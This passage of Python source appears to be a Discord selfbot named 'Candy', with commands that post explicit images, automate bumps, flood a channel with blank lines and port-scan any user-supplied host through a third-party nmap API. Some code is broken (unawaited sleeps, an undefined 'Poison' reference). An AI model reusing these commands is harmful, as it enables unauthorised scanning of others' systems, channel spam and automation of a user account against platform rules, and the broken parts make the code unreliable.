        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"lesbian.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        asyncio.sleep(5)
    await ctx.send(",geoip ./")


@Candy.command()
async def cumslut(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"cumslut.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        asyncio.sleep(5)
    await ctx.send(",geoip ./")


@Candy.command(aliases=["vagina"])
async def pussy(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"pussy.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)
        asyncio.sleep(5)
    await ctx.send(",geoip ./")

@Candy.command()
async def solog(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/solog")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"solog.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Candy.command()
async def spank(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/spank")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"spank.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Candy.command()
async def femdom(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/femdom")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"femdom.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@Candy.command()
async def waifu(ctx):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Candy_waifu.gif"))
    except:
        em = discord.Embed()
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def feed(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_feed.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def tickle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_tickle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def hug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_hug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def cuddle(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/cuddle")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_cuddle.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def smug(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_smug.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def pat(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_pat.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"Candy_kiss.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)


@Candy.command()
async def uptime(ctx):
    await ctx.message.delete()
    now = datetime.datetime.utcnow()  # Timestamp of when uptime function is run
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."
    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
    await ctx.send(uptime_stamp)


@Candy.command(aliases=["pr"])
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Candy.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass

@Candy.command(aliases=['bump'])
async def _auto_bump(ctx, channelid): 
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1 
            channel = Poison.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f" {LIGHTCYAN}Candy {LIGHTWHITE}> {LIGHTGREEN}Sent Bump Number: {count}\n")
            await asyncio.sleep(7200)
        except Exception as e:
        	pass

@Candy.command(pass_context=True)
async def chatclear(ctx): #this bitch is toxic -Poison
 await ctx.message.delete()
 await ctx.send('ﾠﾠ'+'\n' * 1000 + 'ﾠﾠ')

@Candy.command()
async def pscan(ctx, arg): 
    await ctx.message.delete()
    scanyuh = requests.get("https://api.hackertarget.com/nmap/?q=" + arg)
    result = scanyuh.text.strip("   ")
    embed = discord.Embed(title="**Port Scan Results**", description=f"{result}", color=discord.Color(random.randint(0, 0xffffff)))
    await ctx.send(embed=embed)
        
@Candy.command(aliases=['GLeaver'])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in Candy.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()


@Candy.command(alises=["game"])
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Candy.change_presence(activity=game)


@Candy.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.message.delete()
    await Candy.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))


@Candy.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.message.delete()
    await Candy.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))


@Candy.command(aliases=["history"])
async def snipehistory(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Candy.snipe_history_dict:
        try:
            await ctx.send(Candy.snipe_history_dict[currentChannel])
        except:
            del Candy.snipe_history_dict[currentChannel]
    else:
        await ctx.send("snipe history is empty", delete_after=1)
        

@Candy.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.message.delete()
    await Candy.change_presence(activity=None, status=discord.Status.dnd)


@Candy.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@Candy.command()
async def unflip(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)


@Candy.command()
async def fliperoo(ctx):
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)
    await asyncio.sleep(1)
    flip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(flip)


@Candy.command()
async def bold(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('**' + message + '**')


@Candy.command()
async def censor(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('||' + message + '||')


@Candy.command()
async def underline(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('__' + message + '__')


@Candy.command()
async def italicize(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('*' + message + '*')


@Candy.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')


@Candy.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)


@Candy.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")


@Candy.command(name='rolecolor')
async def _role_hexcode(ctx, *, role: discord.Role):
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")


@Candy.command()
async def empty(ctx):
    await ctx.message.delete()
    await ctx.send(chr(173))


@Candy.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.message.delete()
    await Candy.logout()


@Candy.command()
async def news(ctx):
    author = input(f'''{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}*{Fore.LIGHTCYAN_EX}] set author > ''')
    print("\n")
    print(f'''{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}*{Fore.LIGHTCYAN_EX}] sent author: ''' + author)
    embed = discord.Embed(color=0x2F3136)
    embed.set_author(name=author),
    header = input(f'''{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}*{Fore.LIGHTCYAN_EX}] set header > ''')
    print("\n")
    print(f'''{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}*{Fore.LIGHTCYAN_EX}] sent header: ''' + header)
    embed.description = header
    embed.set_footer(text="Cotton Candy Random Embed v3")
    await ctx.send(embed=embed)
    print("\n")


@Candy.command(aliases=["nitrogen"])
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())

@Candy.command()
async def browse(ctx, *, link):
    await ctx.message.delete()
    webbrowser.get('windows-default').open(link)

@Candy.command()
async def stream(ctx):
    await ctx.message.delete()
    nameofstream = input(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] name of stream > {Fore.RESET}")
    print("\n")
    streamurl = input(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] set stream url > {Fore.RESET}")
    print("\n")
    print(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] set streaming status{Fore.RESET}\n")
    print("\n")
    await Candy.change_presence(status=discord.Status.dnd, activity=discord.Streaming(name=nameofstream, url="https://twitch.tv/" + streamurl))
    print("\n")

@Candy.command()
async def linkstream(ctx):
    await ctx.message.delete()
    nameofstream2 = input(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] name of stream > {Fore.RESET}")
    print("\n")
    linkofstream = input(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] set stream url > {Fore.RESET}")
    print("\n")
    print(f" {Style.BRIGHT}{Fore.BLACK}[{Style.DIM}{Fore.MAGENTA}*{Style.BRIGHT}{Fore.BLACK}] set streaming status{Fore.RESET}\n")
    print("\n")
    await Candy.change_presence(status=discord.Status.dnd, activity=discord.Streaming(name=nameofstream2, url=linkofstream))
    print("\n")

if __name__ == '__main__':
    Init()
